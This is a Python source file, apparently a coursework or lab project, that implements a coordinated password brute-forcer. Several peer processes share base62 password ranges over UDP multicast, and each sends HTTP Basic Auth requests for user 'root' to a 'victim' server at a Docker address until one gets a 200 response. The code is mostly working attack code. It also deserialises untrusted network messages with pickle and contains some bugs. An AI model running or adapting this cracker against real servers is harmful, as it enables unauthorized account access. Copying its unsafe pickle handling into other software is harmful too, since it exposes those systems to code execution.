#Definitely not a botnet
from const import *
import base64
import socket
import struct
import itertools
import selectors
import random
import time
import string
import pickle
import copy
import datetime

BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits

# Source: https://stackoverflow.com/questions/1119722/base-62-conversion
# Why are we using this: encoding our passwords as base62 enables us to use an integer to refer to any of the possible combinations
# of alphanumeric characters - this way, we do not need to generate all the possible passwords and store them in memory to then access
# via array index, but just get a random int number (in a range of course, that hasnt been used by peers) and then decode it into a
# password


def encode(num, alphabet):
    """Encode a positive number into Base X and return the string.1
    Arguments:
    - `num`: The number to encode
    - `alphabet`: The alphabet to use for encoding
    """
    if num == 0:
        return alphabet[0]
    arr = []
    arr_append = arr.append  # Extract bound-method for faster access.
    _divmod = divmod  # Access to locals is faster.
    base = len(alphabet)
    while num:
        num, rem = _divmod(num, base)
        arr_append(alphabet[rem])
    arr.reverse()
    return ''.join(arr)


def decode(password, alphabet=BASE62):
    """Decode a Base X encoded password into the number

    Arguments:
    - `password`: The encoded password
    - `alphabet`: The alphabet to use for decoding
    """
    base = len(alphabet)
    strlen = len(password)
    num = 0

    idx = 0
    for char in password:
        power = (strlen - (idx + 1))
        num += alphabet.index(char) * (base ** power)
        idx += 1
    return num


def getPWfromIDX(idx, size: int = PASSWORD_SIZE):
    if 0 > idx or idx >= (62**size):
        print("Idx not in range!")
        return
    str = encode(idx, BASE62)
    if len(str) < size:
        diff = size - len(str)
        for i in range(diff):
            str = "a" + str
    return str

def mergeList(listt):
    '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
    listt.sort()
    changed = True
    while changed:
        changed = False
        for i in range(len(listt)):
            if i == 0:
                continue
            if listt[i-1] == listt[i]:
                del listt[i]
                changed = True
                listt.sort()
                break
            if listt[i-1][1]+1 == listt[i][0]:
                newRange = [listt[i-1][0], listt[i][1]]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
            elif listt[i][1] > listt[i-1][1] >= listt[i][0]:
                newRange = [listt[i-1][0], listt[i][1]]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
            elif listt[i][1] < listt[i-1][1]:
                del listt[i]
                changed = True
                listt.sort()
                break
    return listt

def invertRangeList(listt):
    listt = mergeList(listt)
    #print("DEBUG INVERT:",listt)
    MAX = 62**PASSWORD_SIZE
    if len(listt) == 0:
        return [0, MAX]
    elif len(listt) == 1:
        if listt[0][0] == 0:
            return [[listt[0][1]+1, MAX]]
        elif listt[0][1] == MAX:
            return [[0, listt[0][0]-1]]
        else:
            return[[0,listt[0][0]-1],[listt[0][1]+1,MAX]]
    else:
        newlistt = []
        #print("DEBUG: list",listt)
        for i in range(len(listt)):
            #print("DEBUG: element",i,":",listt[i])
            if i == 0:
                #print("DEBUG: first elem")
                if listt[i][0] == 0:
                    continue
                else:
                    newlistt.append([0, listt[i][0]-1])
                break
            #if i == len(listt)-1:
            else:
                #print("DEBUG: not first elem")
                if listt[i][1] == MAX:
                    pass
                else:
                    newlistt.append([listt[i][1]+1,MAX])
                newlistt.append([listt[i-1][1]+1,listt[i][0]-1])
    #print("newlist ret_",newlistt)
    return newlistt

class zerg:
    # Get it get it it's a zerg rush
    # StarCraft ref - they're played by bruteforce :D
    # like here :D
    # until we can bamboozle the server that is

    def __init__(self, name: str = ""):
        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()
        self.name = name
        self.found = False

        # --Things for communication with victim server (HTTP,TCP)---
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.HOST = "172.17.0.2"  # "host.docker.internal"
        self.PORT = 8000

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.settimeout(0.2)
        self.MCAST_TTL = struct.pack('b', 1)
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT = 10000

        server_address = ('', 10000)
        self.mCastSock.bind(server_address)
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        # Listen for socket activity
        self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)

        self.range = [-2, -1]
        self.current = -1
        self.verified = []
        self.peers = {}

        self.latest_pws = list()
        self.lastTry=0
        self.connect()

    def updateVerified(self):
        '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
        self.verified.sort()
        changed = True
        while changed:
            changed = False
            for i in range(len(self.verified)):
                if i == 0:
                    continue
                if self.verified[i-1] == self.verified[i]:
                    del self.verified[i]
                    changed = True
                    self.verified.sort()
                    break
                if self.verified[i-1][1]+1 == self.verified[i][0]:
                    newRange = [self.verified[i-1][0], self.verified[i][1]]
                    del self.verified[i-1]
                    del self.verified[i-1]
                    self.verified.append(newRange)
                    changed = True
                    self.verified.sort()
                    break
                elif self.verified[i][1] > self.verified[i-1][1] >= self.verified[i][0]:
                    newRange = [self.verified[i-1][0], self.verified[i][1]]
                    del self.verified[i-1]
                    del self.verified[i-1]
                    self.verified.append(newRange)
                    changed = True
                    self.verified.sort()
                    break
                elif self.verified[i][1] < self.verified[i-1][1]:
                    del self.verified[i]
                    changed = True
                    self.verified.sort()
                    break

    def addToVerifiedNum(self, num):
        '''Insert a new num into verified - it'll be merged later'''
        self.verified.append([num, num])
        self.updateVerified()  # merges the mess we've created

    def selectNewRange(self):
        # firstly, tries to find any space not occupied by another slave
        allOccupied = copy.deepcopy(self.verified)
        #print("DEBUG: peers",self.peers)
        #print("DEBUG: verified",allOccupied)
        for peer in self.peers.keys():
            allOccupied.append(self.peers[peer])
        #print("DEBUG: verified after appending peers",allOccupied)
        allOccupied = mergeList(allOccupied)
        #print("DEBUG: all occypied",allOccupied)
        if allOccupied[0][1]-allOccupied[0][0] != 62**PASSWORD_SIZE:
            # a space without a slave exists!
            invert = invertRangeList(allOccupied)
            #print("DEBUG1: invert",invert)
            betterIDX = -1
            betterRNG = 0

            if invert==[]:
                betterIDX=0
            for i in range(len(invert)):
                RNG = invert[i][1]-invert[i][0]
                if RNG > betterRNG:
                    betterRNG = RNG
                    betterIDX = i

            #print("DEBUG: betterIDX",betterIDX)
            return invert[betterIDX]
        else:
            # all spaces are occupied by slaves or already checked
            self.updateVerified()
            invert = invertRangeList(self.verified)
            #print("DEBUG2: verified",self.verified)
            #print("DEBUG2: invert",invert)

            betterIDX = -1
            betterRNG = 0
            for i in range(len(invert)):
                RNG = invert[i][1]-invert[i][0]
                if RNG > betterRNG:
                    betterRNG = RNG
                    betterIDX = i
            print("Better idx",betterIDX)
            low = int((invert[betterIDX][1] - invert[betterIDX][0])/2)
            return [low,invert[betterIDX][1]]

    def sayHello(self):
        '''Get a hello message'''  # Hello there
        msg = {
            'command': 'hello'
            # should we include our address here or smth?
        }
        encodedMSG = pickle.dumps(msg)

        print("Slave", self.name+":", "sending HELLO message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        self.range = [0, 62**PASSWORD_SIZE]
        self.current = self.range[0]-1

    def sayImHere(self):
        '''Get a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',
            'verified': self.verified,  # twitter famous
            'range': self.range
        }
        encodedMSG = pickle.dumps(msg)

        print("Slave", self.name+":", "sending IMHERE message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def newRange(self):
        '''Get a newrange message'''  # this is mine now
        msg = {
            'command': 'newrange',
            'range': self.range
        }
        encodedMSG = pickle.dumps(msg)

        print("Slave", self.name+":", "sending NEWRANGE message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
        

    def gotAll(self):
        '''Get a gotall message'''   # my work here is done
        msg = {
            'command': 'gotall'
        }
        encodedMSG = pickle.dumps(msg)

        print("Slave", self.name+":", "sending GOTALL message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))


    def foundPw(self):  # the 200 ok marks the spot
        '''Get a gotall message'''
        msg = {
            'command': 'foundpw',
            'pw': self.pw
        }
        encodedMSG = pickle.dumps(msg)
        print("Slave", self.name+":", "sending FOUNDPW message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
        exit(0)

        
    def sendMCAST(self, msg):
        print("Slave", self.name+":", "sending message:", msg)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
        while True:
            print("Slave", self.name+":", "waiting to recieve.")
            try:
                data, server = self.mcastSock.recvfrom(1024)
            except socket.timeout:
                print("Slave", self.name+":", "timed out, no more responses.")
                break
            else:
                print("Slave", self.name+":", "recieved:", data, "from", server)
                if server not in self.peers:
                    self.peers.append(server)

    def recvMCAST(self):
        #print("Slave",self.name+":","waiting to recieve. recvmcast")
        try:
            data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            print("Slave",self.name+":","timed out, no more responses.")
            return
        else:
            #check if we're receiving our own messages
            #print("Slave",self.name+":","recieved:",data,"from",server)
           # print("\n",self.mCastSock,"\n")
            recvMSG = pickle.loads(data) # I'm here message
            #print("received message:",recvMSG)

            if recvMSG['command']=='hello':
                print("Slave",self.name+":","recieved hello message:", recvMSG)
                self.sayImHere()
            elif recvMSG['command']=='imhere':
                print("Slave",self.name+":","It's a imhere message:", recvMSG)
                peerRange = recvMSG['range']
                self.peers[server] = peerRange
                peerVerified = recvMSG['verified']
                for range in peerVerified:
                    self.verified.append(range)
                self.updateVerified()
                print("My range:",self.range,"They're range:",peerRange)
                if peerRange[0]>=self.range[1] or peerRange[1]>=self.range[0]:
                    self.range = self.selectNewRange()
                    self.current = self.range[0]-1
                    print("\n\nIMHERE RESULT: Our ranges overlap! New range:",self.range,"Starting from:",self.current)
                    #send newrange
                else: 
                    print("\n\nIMHERE RESULT: Our ranges don't overlap!")
            elif recvMSG['command']=='newrange':
                print("Slave",self.name+":","recieved newrange message:", recvMSG)
                peerRange = recvMSG['range']
                self.peers[server] = peerRange
                # Should this be done here?
                # if peerRange[0]>=self.range[1] and peerRange[1]>=self.range[0]:
                #     self.range = self.selectNewRange()
                #     self.current = self.range[0]-1    
                #     pass #send newrange
            elif recvMSG['command']=='gotall':
                pass
            elif recvMSG['command']=='foundpw':
                print("Password found:",recvMSG["password"]+"!","Shutting down...")
                exit(0) # Shutting down...
            return

    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self, pw: str):
        """Creates the AuthHeader with the created pw"""  # password, not powerword - a priest would help here though
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  # internet says to use carriage return but not sure why

        print("testing pw:", pw)
        msg = httpHeader
        self.send_msg(msg)

    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  # mwahaha
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)
        self.server_response()

    def server_response(self):
        """Receives ONE (1) http response"""
        incoming = ""
        while not "\r\n\r\n" in incoming:
            try:
                incoming_raw = self.s.recv(500)
                incoming = incoming+incoming_raw.decode("ascii")
            except UnicodeDecodeError:
                # I think we're supposed to receive a picture here but this is a puzzle for future camila :P
                break

        if '200' in incoming.split("\n")[0]:
            self.found = True
            self.pw = getPWfromIDX(self.current, PASSWORD_SIZE)
            print("GOT IT!\nwas it "+self.pw+"?")

    def loop(self):
        self.sayHello()
        while not self.found:
            #print("time now:",time.time())
            #print("target time:",self.lastTry + COOLDOWN_TIME/1000)
            if time.time()>self.lastTry + COOLDOWN_TIME/1000:  # TODO - verify  that cooldown time has passed since last time
                print("all your base are belong to us")  # nice ref :D
                toTest = []
                full = False
                for i in range(MIN_TRIES):  # get next MIN_TRIES passwords from ids
                    self.current += 1
                    if self.current > self.range[1]:
                        full = True
                        break
                    self.try_pw(getPWfromIDX(self.current, PASSWORD_SIZE))
                    self.addToVerifiedNum(self.current)
                    if self.found:
                        # send FOUNDPW message
                        print("it was "+getPWfromIDX(self.current, PASSWORD_SIZE))
                        return getPWfromIDX(self.current, PASSWORD_SIZE)
                self.lastTry = time.time()
                self.sayImHere()
                if full:
                    pass
                    # send GOTALL message
            # The usual method for event treatment
            toDo = self.sel.select(0)
            for event, data in toDo:
                callback = event.data
                msg = callback()

slave = zerg("Brood1")
slave.loop()